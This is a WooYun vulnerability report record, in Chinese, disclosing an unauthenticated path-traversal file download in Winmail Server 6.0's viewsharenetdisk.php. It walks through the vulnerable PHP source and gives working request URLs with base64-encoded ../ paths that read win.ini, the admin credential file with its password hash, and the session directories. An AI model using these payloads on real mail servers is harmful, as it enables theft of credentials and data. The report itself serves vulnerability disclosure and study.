{"id": 88202, "wybug_id": "wooyun-2016-0189746", "wybug_title": "Winmail Server 6.0邮件系统存在任意文件下载漏洞（无需登录）                                      ", "wybug_corp": "www.magicwinmail.com", "wybug_author": "胡阿尤", "wybug_date": "2016-03-27 22:40", "wybug_open_date": "2016-06-29 10:50", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-03：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-29：\t细节向公众公开  简要描述： 人生中的第一个通用漏洞，记录一下挖掘过程。初学审计，野路子，大牛莫笑。之前利用过http://www.wooyun.org/bugs/wooyun-2010-057890这个洞刷了一点rank，自此便知道了winmail这款邮件系统，也让我对审计牛们产生了无限的膜拜。近日发现winmail发布了新版本6.0，加之昨天看到http://www.wooyun.org/bugs/wooyun-2016-018906这个洞，又勾起了我的无限遐想，于是下载安装后也正式开始我的代码审计之旅。 详细说明：  一、先展示效果官方demo站地址：http://**.**.**.**\nhttp://**.**.**.**:6080/viewsharenetdisk.php?userid=postmaster&opt=view&filename=Li4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p\n\n\n可直接下载C:\\windows\\win.ini文件\nhttp://**.**.**.**:6080/viewsharenetdisk.php?userid=postmaster&opt=view&filename=Li4vLi4vZGF0YS9hZG1pbnVzZXIuY2Zn\n\n\n直接下载管理用户的配置，内含账号和口令hash哦\nhttp://**.**.**.**:6080/viewsharenetdisk.php?userid=postmaster&opt=sharelink&filename=Li4vLi4vd2VibWFpbC90ZW1wL19zZXNzaW9ucw==\n\n\n\nhttp://**.**.**.**:6080/viewsharenetdisk.php?userid=postmaster&opt=sharelink&filename=Li4vLi4vZGF0YQ==\n\n\n目录文件直接列出来，点下载按钮可以直接下载的。由于会列出子目录中的内容，所以尽量不要列太高层的目录哈，不然会卡很久甚至卡死的。二、挖掘过程从上面的例子大家也已经看到了，存在问题的文件是viewsharenetdisk.php，该文件位于www目录下。\n\n首先试了下，可以直接访问，我们再来一步一步看看需要什么参数，以及参数都有什么要求。\n$userid = trim($userid);\t$iPos = strpos($userid, '@');\tif ($iPos !== false)\t\t$domain = substr($userid, $iPos+1);\telse\t\t$domain = '';\n\nif ($userid == ''){\t\t$smarty->assign('errCode', 1);\t\t$smarty->display($selected_theme.'/netdisk-viewshare.htm');\t\texit;\t}\tgetlanguagetext($selected_common_language, 'NetDisk');\t$domaininfo = load_domaininfo($domain);\t$userinfo = load_userinfo($userid);\tif ($domaininfo == false || $userinfo == false){\t\t$smarty->assign('errCode', 1);\t\t$smarty->display($selected_theme.'/netdisk-viewshare.htm');\t\texit;\t}\n可以看到，$userid不能为空，且load_userinfo($userid)的结果不能为false，这就需要一个确定存在的用户，还好系统有个默认用户postmaster。就算这个用户被禁用了，想找到一个有效的用户还是比较容易的。$domain为$userid的@后面部分或者为空，这样就确定了url中应该有userid=postmaster@**.**.**.**，后来经过测试发现$domain为空时load_domaininfo($domain)会获取主域名的值，所以可以简化一下userid=postermaster。\n\n页面的结果有些变化了，接着往下看\nif ($filename != '') {\t\t$filename = str_replace(' ', '+', $filename);\t\t$filename = base64_decode($filename);\t}\n文件名不为空的话，将空格替换为+，然后base64解码，看来文件名参数应该是base64格式的了\n$bAttach = false;\tif ($chksum != '') {\t\tif ($chksum != md5($userid.'|'.$filename.'|'.$start)) {\t\t\t$smarty->assign('errCode', 1);\t\t\t$smarty->display($selected_theme.'/netdisk-viewshare.htm');\t\t\texit;\t\t}\t\techo var_dump($nowtime - $start > $netdisk_share_expire);\t\tif ($nowtime - $start > $netdisk_share_expire) {\t\t\t$smarty->assign('errCode', 1);\t\t\t$smarty->display($selected_theme.'/netdisk-viewshare.htm');\t\t\texit;\t\t}\t\t$bAttach = true;\t}\tif ($bAttach == false) {\t\t$ftp = new FtpShare($session_value['homedirectory']);\t\t$share = $ftp->GetShare();\t\techo var_dump($session_value['homedirectory']);\t\tif (!empty($share['enddate']) && $nowtime > $share['enddate']){\t\t\t$smarty->assign('errCode', 1);\t\t\t$smarty->display($selected_theme.'/calendar-viewshare.htm');\t\t\texit;\t\t}\t\t\t\t$share['password'] = Crypt_Decode($share['password']);\t\tif (!empty($share['user']) && !empty($share['password'])) {\t\t\tif (isset($_SERVER['HTTP_AUTHORIZATION'])) {\t\t\t\tlist($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) = explode(':', base64_decode(substr($_SERVER['HTTP_AUTHORIZATION'], 6)));\t\t\t}\t\t\t\t\t$realmname = convert($ftp_share_title, false);\t\t\tif (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) {\t\t\t\theader('WWW-Authenticate: Basic realm=\"'.$realmname.'\"'); \t\t\t\theader('HTTP/1.0 401 Unauthorized'); \t\t\t\techo 'Authorization Required !'; \t\t\t\texit; \t\t\t} \t\t\t\t\t\t$bAuthed = false; \t\t\tif ($_SERVER['PHP_AUTH_USER'] == $share['user'] && $_SERVER['PHP_AUTH_PW'] == $share['password']) \t\t\t\t$bAuthed = true; \t\t\t\t\t\tif ($bAuthed == false) {\t\t\t\theader('WWW-Authenticate: Basic realm=\"'.$realmname.'\"'); \t\t\t\theader('HTTP/1.0 401 Unauthorized'); \t\t\t\techo 'Authorization Failure !'; \t\t\t\texit; \t\t\t}\t\t}\t}\n有两个判断，里面各种exit，这个地方过不去的话就没办法继续往下走了，一下子紧张起来，在这里花费不少时间。先看第一判断，最后一句是$bAttach = true;能到这一步，第二个判断就不用进去了，第二个代码那么长，里面还各种password，我当然不想进去了。于是凑条件，$chksum不能为空，还得等于md5($userid.'|'.$filename.'|'.$start)，然后$nowtime - $start还不能大于$netdisk_share_expire，就是现在的时间减去文件开始共享的时间，不能大于文件共享的有效期，好复杂，还好这里的$start可以控制，那么尽量让$nowtime - $start无限小就好了，这样$userid、$filename、$start基本都确定了，md5值也可以计算出来了，这个判断就算绕过了，不过好麻烦啊，每改一次文件名都得重新计算下md5.事实证明，这里的确是把事情弄复杂了，挖掘完漏洞回过头来看这里的时候，发现第二个判断里面$share = $ftp->GetShare();获取用户的共享信息，如果没有共享的话，$share['enddate']、$share['user']、$share['password']都会是空，所以下面的两个子判断就直接跳过去了。postmaster是默认用户，应该不会有人去用这个用户共享什么内容吧，所以这里的两个判断实际上无需理会。接着往下走，就到了处理操作的部分了。\nswitch ($opt){case 'view':case 'download':\t$ftpfile = $filename;\t$iPos = strrpos($ftpfile, '/');\tif ($iPos !== false)\t\t$filename = substr($ftpfile, $iPos+1);\telse\t\t$filename = str_replace('/', '', $ftpfile);\tif(!file_exists($temporary_directory.'_attachments'))\t\tmkdir($temporary_directory.'_attachments');\tif ($opt == 'view'){\t\t$suffix = substr($filename, strrpos($filename, '.'));\t\t$suffix = strtolower($suffix);\t\tif (isset($mimetypes[$suffix]))\t\t\t$contenttype = $mimetypes[$suffix];\t\telse\t\t\t$contenttype = 'application/octet-stream';\t\t$disposition = 'inline';\t}\telse{\t\t$contenttype = 'application/force-download';\t\t$disposition = 'attachment';\t}\t\t$localfile = $ftphandle->ftp_home_directory.$ftpfile;  \tif (file_exists($localfile)) {\t\t$length = filesize($localfile);\t\t   \t\theader('Content-type: '.$contenttype);\t  \theader('Content-Disposition: '.$disposition.'; filename=\"'.$filename.'\"');\t\theader('Accept-Ranges: bytes');\t\theader('Content-Length: '.$length);\t\t$fp = fopen($localfile, \"rb\");\t\tif ($fp){\t\t\twhile(!feof($fp))\t\t\t\techo fread($fp, 655360);\t\t\t\t\t\t\tfclose($fp);\t\t}    }\n$filename经过base64解密后，传到这里，并没有经过任何过滤，就赋值给了$ftpfile，而$ftpfile也没有经过任何过滤就拼接出了$localfile并传给了fopen函数，至此这个漏洞的真正成因弄清楚了。利用可以切换到上级目录的../，并结合文件的具体路径，经过base64编码后作为参数传入就可以下载任意指定文件了。到这里本应该结束了，但是这样每查看一个文件都要进行编码好累啊，我又不会写脚本。想着应该不会这么费事的，下面还有个opt操作数，接着往下看吧。\ncase 'sharelink':default:\tif ($isdir != 1 && $filename != '') {\t\t$dispFileInfo = $ftphandle->get_folder_file($filename);\t}\telse {\t\t$dispdir = $filename.'/';\t\techo var_dump($dispdir);\t\t$dispFileInfo = array();\t\t$ftp = new FtpShare($session_value['homedirectory']);\t\t$shareFtpFile = $ftp->GetAllShareFile();\t\tforeach ($shareFtpFile as $shareItem) {\n先看else下面的部分，$ftp->GetAllShareFile();postmaster没有共享内容，所以这里获取不到任何东西。就剩下$ftphandle->get_folder_file($filename)；这里了。\nfunction get_folder_file($ftpfolder) {\t\t$filelist = array();\t\t$temppath = $this->ftp_home_directory.$ftpfolder;\t\tif (!file_exists($temppath))\t\t\treturn false;\t\tif (is_dir($temppath)) {\t\t\t$dh = opendir($temppath);\t\t\tif ($dh){\t\t\t\twhile($file = readdir($dh)) {\t\t\t\t\tif ($file == '.' || $file == '..')\t\t\t\t\t\tcontinue;\t\t\t\t\t\t\t\t\t\t$fullfolder = $ftpfolder.'/'.$file;\t\t\t\t\t$subfolderinfo = $this->get_folder_file($fullfolder);\t\t\t\t\t\t\t\t\t\t\tif ($subfolderinfo != false) {\t\t\t    \t\tforeach ($subfolderinfo as $item)\t\t    \t\t\t\t$filelist[] = $item;\t\t    \t\t}\t\t\t\t}\t\t\t}\t\t}\t\telse {\t\t\t$info = array();\t\t\t\t    \t$info['name'] = $ftpfolder;\t    \t$info['date'] = filemtime($temppath);\t    \t$info['size'] = filesize($temppath);\t    \t\t    \t$filelist[] = $info;\t\t}\t\t\t\treturn $filelist;\t}\n这个函数位于/inc/class.ftpfolder.php文件中，可以看到只要传进来的参数是目录名，一样可以处理的。好了，分析结束，心情有点激动，废话有点多，大家见谅。   漏洞证明：  由于新版本刚发布没多久，已经升级到6.0的还真不好找，终于找着一个，作为证明吧。http://**.**.**.**/\nhttp://**.**.**.**/viewsharenetdisk.php?userid=postmaster&opt=view&filename=Li4vLi4vZGF0YS9hZG1pbnVzZXIuY2Zn\n\n\n\nhttp://**.**.**.**/viewsharenetdisk.php?userid=postmaster&opt=sharelink&filename=Li4vLi4vZGF0YQ==\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 胡阿尤@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2016-03-31 10:42 厂商回复： CNVD未直接复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}